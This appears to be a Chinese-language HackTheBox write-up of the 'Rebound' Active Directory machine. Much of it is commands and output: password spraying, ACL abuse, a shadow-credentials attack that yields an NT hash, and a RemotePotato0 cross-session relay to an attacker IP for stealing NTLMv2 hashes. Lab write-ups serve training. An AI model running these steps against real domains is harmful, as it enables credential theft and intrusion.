+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:rebound.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAPS       10.10.11.231    <span class="m">636</span>    DC01             <span class="o">[</span>-<span class="o">]</span> rebound.htb<span class="se">\l</span>dap_monitor:1GR8t@<span class="nv">$$</span>4u
+</span></span><span class="line"><span class="cl">LDAPS       10.10.11.231    <span class="m">636</span>    DC01             <span class="o">[</span>-<span class="o">]</span> LDAPS channel binding might be enabled, this is only supported with kerberos authentication. Try using <span class="s1">&#39;-k&#39;</span>.
+</span></span></code></pre></div><p>发现可以访问smb，但是ldap还是不可以访问，尝试申请票据后加<code>-k</code>参数验证</p>
+<p>先同步时间</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ntpdate -s rebound.htb
+</span></span></code></pre></div><p>申请票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-getTGT <span class="s1">&#39;rebound.htb&#39;</span>/<span class="s1">&#39;ldap_monitor&#39;</span>:<span class="s1">&#39;1GR8t@$$4u&#39;</span> -dc-ip 10.10.11.231
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in ldap_monitor.ccache
+</span></span></code></pre></div><p>导入票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>ldap_monitor.ccache
+</span></span></code></pre></div><p>加<code>-k</code>参数重新验证 <code>ldap</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc ldap 10.10.11.231 -u <span class="s1">&#39;ldap_monitor&#39;</span> -p <span class="s1">&#39;1GR8t@$$4u&#39;</span> -k
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:rebound.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAPS       10.10.11.231    <span class="m">636</span>    DC01             <span class="o">[</span>+<span class="o">]</span> rebound.htb<span class="se">\l</span>dap_monitor
+</span></span></code></pre></div><p>验证通过</p>
+<h1 id="bloodhound信息收集">
+<a class="header-anchor" href="#bloodhound%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86"></a>
+bloodhound信息收集
+</h1><p>有域用户了，但是尝试后发现<code>winrm</code>登录失败，所以进行<code>bloodhound</code>信息收集</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodhound-python -d rebound.htb -c all -u ldap_monitor -p <span class="s1">&#39;1GR8t@$$4u&#39;</span> -ns 10.10.11.231 --zip
+</span></span><span class="line"><span class="cl">INFO: BloodHound.py <span class="k">for</span> BloodHound LEGACY <span class="o">(</span>BloodHound 4.2 and 4.3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">INFO: Found AD domain: rebound.htb
+</span></span><span class="line"><span class="cl">INFO: Getting TGT <span class="k">for</span> user
+</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: dc01.rebound.htb
+</span></span><span class="line"><span class="cl">WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains in the forest
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> computers
+</span></span><span class="line"><span class="cl">INFO: Connecting to GC LDAP server: dc01.rebound.htb
+</span></span><span class="line"><span class="cl">WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
+</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: dc01.rebound.htb
+</span></span><span class="line"><span class="cl">WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">16</span> users
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">53</span> groups
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">2</span> gpos
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">2</span> ous
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">19</span> containers
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">0</span> trusts
+</span></span><span class="line"><span class="cl">INFO: Starting computer enumeration with <span class="m">10</span> workers
+</span></span><span class="line"><span class="cl">INFO: Querying computer: dc01.rebound.htb
+</span></span><span class="line"><span class="cl">INFO: Done in 00M 23S
+</span></span><span class="line"><span class="cl">INFO: Compressing output into 20250326231730_bloodhound.zip
+</span></span></code></pre></div><p>使用<code>bloodhound</code>分析，点击<code>Shortest Paths to Unconstrained Delegation Systems</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250326165544039-1390722587.png" alt="image-20250326165542837"></p>
+<p>注意到貌似有一条可利用的路线，可以看到<code>winrm_svc</code>用户可以通过<code>CanPSRemote</code>登录</p>
+<p>所以我们的目标就明确了，再往前看发现<code>ServiceMgmt</code>在<code>Service Users</code>组织单元(OU)上具有<code>GenericAll</code>权限</p>
+<p>但是最前面的三个用户，我们现在一个也没接触到，所以浅试一下密码喷洒，看看能否得到更多用户的信息</p>
+<h1 id="密码喷洒">
+<a class="header-anchor" href="#%e5%af%86%e7%a0%81%e5%96%b7%e6%b4%92"></a>
+密码喷洒
+</h1><p>由于我们只有一个密码，所以我们尝试用这个喷洒</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc ldap 10.10.11.231 -u users.txt -p <span class="s1">&#39;1GR8t@$$4u&#39;</span> -k --continue-on-success
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:rebound.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.231    <span class="m">389</span>    DC01             <span class="o">[</span>-<span class="o">]</span> rebound.htb<span class="se">\A</span>dministrator:1GR8t@<span class="nv">$$</span>4u KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.231    <span class="m">389</span>    DC01             <span class="o">[</span>-<span class="o">]</span> rebound.htb<span class="se">\G</span>uest:1GR8t@<span class="nv">$$</span>4u KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.231    <span class="m">389</span>    DC01             <span class="o">[</span>-<span class="o">]</span> rebound.htb<span class="se">\k</span>rbtgt:1GR8t@<span class="nv">$$</span>4u KDC_ERR_CLIENT_REVOKED
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.231    <span class="m">389</span>    DC01             <span class="o">[</span>-<span class="o">]</span> rebound.htb<span class="se">\D</span>C01$:1GR8t@<span class="nv">$$</span>4u KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.231    <span class="m">389</span>    DC01             <span class="o">[</span>-<span class="o">]</span> rebound.htb<span class="se">\p</span>paul:1GR8t@<span class="nv">$$</span>4u KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.231    <span class="m">389</span>    DC01             <span class="o">[</span>-<span class="o">]</span> rebound.htb<span class="se">\l</span>lune:1GR8t@<span class="nv">$$</span>4u KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.231    <span class="m">389</span>    DC01             <span class="o">[</span>-<span class="o">]</span> rebound.htb<span class="se">\f</span>flock:1GR8t@<span class="nv">$$</span>4u KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.231    <span class="m">389</span>    DC01             <span class="o">[</span>+<span class="o">]</span> rebound.htb<span class="se">\j</span>jones account vulnerable to asreproast attack
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.231    <span class="m">389</span>    DC01             <span class="o">[</span>-<span class="o">]</span> rebound.htb<span class="se">\m</span>malone:1GR8t@<span class="nv">$$</span>4u KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.231    <span class="m">389</span>    DC01             <span class="o">[</span>-<span class="o">]</span> rebound.htb<span class="se">\n</span>noon:1GR8t@<span class="nv">$$</span>4u KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">LDAPS       10.10.11.231    <span class="m">636</span>    DC01             <span class="o">[</span>+<span class="o">]</span> rebound.htb<span class="se">\l</span>dap_monitor
+</span></span><span class="line"><span class="cl">LDAPS       10.10.11.231    <span class="m">636</span>    DC01             <span class="o">[</span>+<span class="o">]</span> rebound.htb<span class="se">\o</span>orend
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.231    <span class="m">389</span>    DC01             <span class="o">[</span>-<span class="o">]</span> rebound.htb<span class="se">\w</span>inrm_svc:1GR8t@<span class="nv">$$</span>4u KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.231    <span class="m">389</span>    DC01             <span class="o">[</span>-<span class="o">]</span> rebound.htb<span class="se">\b</span>atch_runner:1GR8t@<span class="nv">$$</span>4u KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.231    <span class="m">389</span>    DC01             <span class="o">[</span>-<span class="o">]</span> rebound.htb<span class="se">\t</span>brady:1GR8t@<span class="nv">$$</span>4u KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.231    <span class="m">389</span>    DC01             <span class="o">[</span>-<span class="o">]</span> rebound.htb<span class="se">\d</span>elegator$:1GR8t@<span class="nv">$$</span>4u KDC_ERR_PREAUTH_FAILED
+</span></span></code></pre></div><p>还真找到了，一个新用户<code>oorend</code>，验证一下</p>
+<p>还需要申请票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-getTGT <span class="s1">&#39;rebound.htb&#39;</span>/<span class="s1">&#39;oorend&#39;</span>:<span class="s1">&#39;1GR8t@$$4u&#39;</span> -dc-ip 10.10.11.231
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in oorend.ccache
+</span></span></code></pre></div><p>导入票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>oorend.ccache
+</span></span></code></pre></div><p>验证</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc ldap 10.10.11.231 -u <span class="s1">&#39;oorend&#39;</span> -p <span class="s1">&#39;1GR8t@$$4u&#39;</span> -k
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:rebound.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAPS       10.10.11.231    <span class="m">636</span>    DC01             <span class="o">[</span>+<span class="o">]</span> rebound.htb<span class="se">\o</span>orend
+</span></span></code></pre></div><p>没问题，试了一下<code>winrm</code>，但是失败了</p>
+<h1 id="攻击面分析">
+<a class="header-anchor" href="#%e6%94%bb%e5%87%bb%e9%9d%a2%e5%88%86%e6%9e%90"></a>
+攻击面分析
+</h1><p>有了<code>oorend</code>，就可以研究攻击路线了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250326170430332-946389261.png" alt="image-20250326170429125"></p>
+<p>大概就这个路线，详细分析一下</p>
+<ol>
+<li>由于<code>oorend</code>用户对<code>ServiceMgmt</code>组有<code>AddSelf</code>权限，所以我们可以把自己加入到其组中</li>
+<li>而<code>ServiceMgmt</code>组在<code>Service Users</code>组织单元(OU)上具有<code>GenericAll</code>权限，所以我们可以将权限授予给<code>Service Users</code>内的所有成员，结果就是<code>oorend</code>用户对<code>winrm_svc</code>用户具有<code>GenericAll</code>权限</li>
+<li>通过<code>winrm_svc</code>用户登录</li>
+</ol>
+<h1 id="拿下winrm_svc">
+<a class="header-anchor" href="#%e6%8b%bf%e4%b8%8bwinrm_svc"></a>
+拿下winrm_svc！
+</h1><blockquote>
+<p>参考链接：https://www.thehacker.recipes/ad/movement/dacl/</p>
+</blockquote>
+<p>先同步时间</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ntpdate -s rebound.htb
+</span></span></code></pre></div><p>先把<code>oorend</code>用户添加到<code>ServiceMgmt</code>组</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodyAD -d rebound.htb -u oorend -p <span class="s1">&#39;1GR8t@$$4u&#39;</span> --host dc01.rebound.htb add groupMember ServiceMGMT oorend
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> oorend added to ServiceMGMT
+</span></span></code></pre></div><p>现在<code>oorend</code>用户已经加入到<code>ServiceMgmt</code>组了，现在对服务用户<code>OU</code>有<code>GenericAll</code>权限，我们就可以将这个权限扩展到<code>OU</code>内的所有对象，所以我们可以扩展到<code>winrm_svc</code>用户</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodyAD -u oorend -p <span class="s1">&#39;1GR8t@$$4u&#39;</span> -d rebound.htb --host 10.10.11.231 add genericAll <span class="s1">&#39;OU=SERVICE USERS,DC=REBOUND,DC=HTB&#39;</span> oorend
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> oorend has now GenericAll on <span class="nv">OU</span><span class="o">=</span>SERVICE USERS,DC<span class="o">=</span>REBOUND,DC<span class="o">=</span>HTB
+</span></span></code></pre></div><p>现在我们对<code>winrm_svc</code>用户就有<code>GenericAll</code>权限了，直接<code>Shadow Credentials</code> 攻击</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certipy-ad shadow auto -u oorend@rebound.htb -p <span class="s1">&#39;1GR8t@$$4u&#39;</span> -k -account winrm_svc -target dc01.rebound.htb
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Targeting user <span class="s1">&#39;winrm_svc&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Generating certificate
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate generated
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Generating Key Credential
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Key Credential generated with DeviceID <span class="s1">&#39;f9ad8249-f723-4d16-7580-eb59daf80d2f&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Adding Key Credential with device ID <span class="s1">&#39;f9ad8249-f723-4d16-7580-eb59daf80d2f&#39;</span> to the Key Credentials <span class="k">for</span> <span class="s1">&#39;winrm_svc&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Successfully added Key Credential with device ID <span class="s1">&#39;f9ad8249-f723-4d16-7580-eb59daf80d2f&#39;</span> to the Key Credentials <span class="k">for</span> <span class="s1">&#39;winrm_svc&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Authenticating as <span class="s1">&#39;winrm_svc&#39;</span> with the certificate
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using principal: winrm_svc@rebound.htb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get TGT...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got TGT
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saved credential cache to <span class="s1">&#39;winrm_svc.ccache&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to retrieve NT <span class="nb">hash</span> <span class="k">for</span> <span class="s1">&#39;winrm_svc&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Restoring the old Key Credentials <span class="k">for</span> <span class="s1">&#39;winrm_svc&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Successfully restored the old Key Credentials <span class="k">for</span> <span class="s1">&#39;winrm_svc&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NT <span class="nb">hash</span> <span class="k">for</span> <span class="s1">&#39;winrm_svc&#39;</span>: e392b1774e35f731ba0650f6fc812a99
+</span></span></code></pre></div><p><strong>注：上面的操作需要在短时间内完成，不然会恢复初始状态</strong></p>
+<p>拿到hash，验证一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc winrm 10.10.11.231 -u winrm_svc -H e392b1774e35f731ba0650f6fc812a99
+</span></span><span class="line"><span class="cl">WINRM       10.10.11.231    <span class="m">5985</span>   DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:rebound.htb<span class="o">)</span>
+</span></span><span class="line"><span class="cl">WINRM       10.10.11.231    <span class="m">5985</span>   DC01             <span class="o">[</span>+<span class="o">]</span> rebound.htb<span class="se">\w</span>inrm_svc:e392b1774e35f731ba0650f6fc812a99 <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</span></span></code></pre></div><p>拿<code>evil-winrm</code>登录</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">evil-winrm -i 10.10.11.231 -u winrm_svc -H 4469650fd892e98933b4536d2e86e512
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="sb">`</span>quoting_detection_proc<span class="err">&#39;</span> <span class="k">for</span> module Reline
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_svc<span class="se">\D</span>ocuments&gt; whoami
+</span></span><span class="line"><span class="cl">rebound<span class="se">\w</span>inrm_svc
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_svc<span class="se">\D</span>ocuments&gt;
+</span></span></code></pre></div><p>在<code>Desktop</code>找到<code>user.txt</code></p>
+<h1 id="后信息收集">
+<a class="header-anchor" href="#%e5%90%8e%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86"></a>
+后信息收集
+</h1><p>先看看能不能利用ADCS服务提权</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certipy-ad find -k -u <span class="s1">&#39;winrm_svc&#39;</span> -hashes e392b1774e35f731ba0650f6fc812a99 -target dc01.rebound.htb -dc-ip 10.10.11.231 -stdout -vulnerable
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">33</span> certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate authorities
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">1</span> certificate authority
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">11</span> enabled certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;rebound-DC01-CA&#39;</span> via CSRA
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Got error <span class="k">while</span> trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;rebound-DC01-CA&#39;</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;rebound-DC01-CA&#39;</span> via RRP
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got CA configuration <span class="k">for</span> <span class="s1">&#39;rebound-DC01-CA&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Enumeration output:
+</span></span><span class="line"><span class="cl">Certificate Authorities
+</span></span><span class="line"><span class="cl">  <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    CA Name                             : rebound-DC01-CA
+</span></span><span class="line"><span class="cl">    DNS Name                            : dc01.rebound.htb
+</span></span><span class="line"><span class="cl">    Certificate Subject                 : <span class="nv">CN</span><span class="o">=</span>rebound-DC01-CA, <span class="nv">DC</span><span class="o">=</span>rebound, <span class="nv">DC</span><span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">    Certificate Serial Number           : 42467DADE6281F8846DC3B6CEE24740D
+</span></span><span class="line"><span class="cl">    Certificate Validity Start          : 2023-04-08 13:55:49+00:00
+</span></span><span class="line"><span class="cl">    Certificate Validity End            : 2122-04-08 14:05:49+00:00
+</span></span><span class="line"><span class="cl">    Web Enrollment                      : Disabled
+</span></span><span class="line"><span class="cl">    User Specified SAN                  : Disabled
+</span></span><span class="line"><span class="cl">    Request Disposition                 : Issue
+</span></span><span class="line"><span class="cl">    Enforce Encryption <span class="k">for</span> Requests     : Enabled
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Owner                             : REBOUND.HTB<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">      Access Rights
+</span></span><span class="line"><span class="cl">        ManageCertificates              : REBOUND.HTB<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">                                          REBOUND.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          REBOUND.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        ManageCa                        : REBOUND.HTB<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">                                          REBOUND.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          REBOUND.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        Enroll                          : REBOUND.HTB<span class="se">\A</span>uthenticated Users
+</span></span><span class="line"><span class="cl">Certificate Templates                   : <span class="o">[</span>!<span class="o">]</span> Could not find any certificate templates
+</span></span></code></pre></div><p>有ADCS服务，但是没找到可利用的点，去翻翻机器</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers&gt; ls
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                -------------         ------ ----
+</span></span><span class="line"><span class="cl">d-----        8/28/2023   8:23 PM                Administrator
+</span></span><span class="line"><span class="cl">d-r---        7/20/2021  12:23 PM                Public
+</span></span><span class="line"><span class="cl">d-----        8/22/2023  12:05 PM                tbrady
+</span></span><span class="line"><span class="cl">d-----         4/8/2023   2:08 AM                winrm_svc
+</span></span></code></pre></div><p>发现还有个<code>tbrady</code>用户，回到<code>bloodhound</code>再看看</p>
+<p>点击<code>First Degree Object Control</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250327171250329-1291488053.png" alt="image-20250327171237614"></p>
+<p>发现当前用户可以读取<code>DELEGATOR$</code>机器账户的<code>gMSA</code>密码，	但还是不能拿到<code>tbrady</code>用户的凭据</p>
+<p>可以确定的是我们的目标就是这个用户</p>
+<h1 id="remotepotato0跨会话中继">
+<a class="header-anchor" href="#remotepotato0%e8%b7%a8%e4%bc%9a%e8%af%9d%e4%b8%ad%e7%bb%a7"></a>
+RemotePotato0跨会话中继
+</h1><p>最终发现了一个名为 <a href="https://github.com/antonioCoco/RemotePotato0">RemotePotato0</a> 的漏洞，它可以利用跨会话中继，设置本地监听器并强制特权 <code>DCOM</code> 激活服务到它，从而触发<strong>当前在目标计算机中登录的任何用户的</strong> <code>NTLM</code> 身份验证。我们可以在 <code>tbrady</code> 登录机器时获得他的 <code>NTLMv2</code> 哈希值！</p>
+<blockquote>
+<p>它滥用 DCOM 激活服务，并触发当前在目标计算机中登录的任何用户的 NTLM 身份验证。要求特权用户（例如域管理员用户）登录同一台计算机。触发 NTLM type1 后，我们设置一个跨协议中继服务器，该服务器接收特权 type1 消息，并通过解压缩 RPC 协议并通过 HTTP 打包身份验证将其中继到第三个资源。在接收端，您可以设置另一个中继节点（例如 ntlmrelayx）或直接中继到特权资源。RemotePotato0 还允许抓取和窃取登录机器上的每个用户的 NTLMv2 哈希值。</p>
+</blockquote>
+<p>所以可以抓到其他登录用户的hash，我们在本地设置一个 <code>socat</code> 中继，将 RPC 调用发送到我们的攻击机器，并将其中继回 <code>RPC</code> 服务器并捕获登录到机器的其他用户的 <code>NTLMv2</code> 哈希值 。</p>
+<p>将工具传到机器上</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_svc<span class="se">\D</span>ocuments&gt; upload RemotePotato0.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Uploading /root/HackTheBox/Rebound/RemotePotato0.exe to C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_svc<span class="se">\D</span>ocuments<span class="se">\R</span>emotePotato0.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Data: <span class="m">235520</span> bytes of <span class="m">235520</span> bytes copied
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Upload successful!
+</span></span></code></pre></div><p>在本地设置一个<code>socat</code> 中继</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999
+</span></span></code></pre></div><p>在目标机器上运行</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./RemotePotato0.exe -m <span class="m">2</span> -x 10.10.16.4 -p <span class="m">9999</span> -s <span class="m">1</span>
+</span></span></code></pre></div><p>选择以会话 <code>1</code> 为目标是因为会话 <code>0</code> 是为服务和非交互式用户应用程序保留的（我们在 <code>WinRM</code> 期间所处的位置）。以本机方式登录到 Windows 的用户必须在会话 <code>1</code> 或更高版本中运行</p>
+<p>不一会就捕获到<code>tbrady</code>用户的<code>hash</code>了</p>
